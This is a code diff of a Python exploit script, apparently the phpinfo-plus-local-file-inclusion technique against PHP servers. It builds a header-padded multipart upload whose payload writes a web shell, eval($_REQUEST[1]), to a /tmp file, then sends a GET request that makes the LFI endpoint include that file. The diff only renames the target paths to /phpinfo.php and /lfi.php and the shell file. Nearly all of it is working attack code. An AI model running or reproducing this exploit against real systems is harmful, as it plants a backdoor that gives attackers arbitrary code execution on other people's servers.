@@ -6,7 +6,7 @@ import socket
 def setup(host, port):
     TAG="Security Test"
     PAYLOAD="""%s\r
-<?php file_put_contents('/tmp/success', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
+<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
     REQ1_DATA="""-----------------------------7dbff1ded0714\r
 Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
 Content-Type: text/plain\r
@@ -14,7 +14,7 @@ Content-Type: text/plain\r
 %s
 -----------------------------7dbff1ded0714--\r""" % PAYLOAD
     padding="A" * 5000
-    REQ1="""POST /1.php?a="""+padding+""" HTTP/1.1\r
+    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
 Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
 HTTP_ACCEPT: """ + padding + """\r
 HTTP_USER_AGENT: """+padding+"""\r
@@ -26,7 +26,7 @@ Host: %s\r
 \r
 %s""" %(len(REQ1_DATA),host,REQ1_DATA)
     #modify this to suit the LFI script   
-    LFIREQ="""GET /2.php?file=%s HTTP/1.1\r
+    LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r
 User-Agent: Mozilla/4.0\r
 Proxy-Connection: Keep-Alive\r
 Host: %s\r
